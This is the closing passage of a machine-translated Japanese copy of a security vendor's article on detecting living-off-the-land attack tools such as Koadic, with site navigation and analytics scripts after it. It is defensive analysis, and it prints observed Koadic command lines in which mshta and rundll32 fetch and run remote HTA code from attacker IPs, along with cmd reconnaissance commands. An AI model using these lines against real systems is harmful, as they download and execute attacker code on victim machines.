<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ActiveXObjectを介してWScript.Shellオブジェクトを作成し、</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大きな実行可能ボディ。</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
初期接続はステージャーによって開始されるため、Windowsイベントを介してそのアクティビティを検出することが可能になります。</font><font style="vertical-align: inherit;">mshtaの場合、これはイベント4688であり、起動属性を持つプロセスの作成について説明します。</font></font><br>
<br>
<pre><code class="bash hljs">C:\Windows\system32\mshta.exe http://192.168.211.1:9999/dXpT6</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Koadicの実行中に、それを完全に特徴付ける属性を持つ他の4688イベントを確認できます。</font></font><br>
<br>
<pre><code class="bash hljs">rundll32.exe http://192.168.241.1:9999/dXpT6?sid=1dbef04007a64fba83edb3f3928c9c6c; csrf=;\..\..\..\mshtml,RunHTMLApplication<font></font>
rundll32.exe http://192.168.202.136:9999/dXpT6?sid=12e0bbf6e9e5405690e5ede8ed651100;csrf=18f93a28e0874f0d8d475d154bed1983;\..\..\..\mshtml,RunHTMLApplication<font></font>
<span class="hljs-string">"C:\Windows\system32\cmd.exe"</span> /q /c chcp 437 &amp; net session 1&gt; C:\Users\user02\AppData\Local\Temp\6dc91b53-ddef-2357-4457-04a3c333db06.txt 2&gt;&amp;1
<span class="hljs-string">"C:\Windows\system32\cmd.exe"</span> /q /c chcp 437 &amp; ipconfig 1&gt; C:\Users\user02\AppData\Local\Temp\721d2d0a-890f-9549-96bd-875a495689b7.txt 2&gt;&amp;1</code></pre><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">調査結果</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
土地を離れた生活の傾向は侵入者の間で人気を集めています。彼らは必要に応じて組み込みのWindowsツールとメカニズムを使用します。この原則に従う人気の高いKoadic、CrackMapExec、ImpacketツールがAPTレポートでますます見つかるのがわかります。これらのツールのGitHubでのフォークの数も増えており、新しいフォークが登場しています（現在、すでに約1000個あります）。その傾向はその単純さのために人気が高まっています。攻撃者はサードパーティのツールを必要とせず、すでに被害者のマシンにあり、保護ツールをバイパスする手助けをしています。私たちはネットワーク接続の研究に焦点を合わせています。上記の各ツールはネットワークトラフィックにマークを残しています。それらの詳細な調査により、当社の製品</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">PT Network Attack Discovery</font></a><font style="vertical-align: inherit;">を教えることができました</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">それらを検出します。これは、最終的に、彼らが参加するサイバーインシデントのチェーン全体を調査するのに役立ちます。</font></font><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">著者</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font><br>
 <br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Positive Technologies、PT Expert Security Center、エキスパートサービス責任者、Anton Tyurin氏</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Egor Podmokov、エキスパート、PT Expert Security Center、Positive Technologies</font></font></li>
</ul></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja460507/index.html">XENと自動車の将来：オープンソースハイパーバイザーが商用自動車ソリューションの競合相手になる方法</a></li>
<li><a href="../ja460509/index.html">常駐プロキシがビジネスでどのように役立つか：データマイニングでInfaticaを使用する実際のケース</a></li>
<li><a href="../ja460511/index.html">PHP-FPMの調整：最大のパフォーマンスを得るためにpm staticを使用する</a></li>
<li><a href="../ja460513/index.html">Flutter 1.7-2019年7月10日リリースの新機能</a></li>
<li><a href="../ja460515/index.html">私たちはロボモービルの出現にどのくらい近いですか？</a></li>
<li><a href="../ja460521/index.html">とらえどころのないマルヴァリの冒険、パートIV：DDEとWordドキュメントのフィールド</a></li>
<li><a href="../ja460523/index.html">BeerPHPドリンクキャップにスムーズに変化するミタップの発表（モスクワおよびオンライン）</a></li>
<li><a href="../ja460525/index.html">7月のDINS IT EVENINGへようこそ：QAおよびJS</a></li>
<li><a href="../ja460527/index.html">pwnable.kr 06-ランダムおよび09-間違いによる問題解決</a></li>
<li><a href="../ja460531/index.html">ITの世界からの奇妙な倒錯-5</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>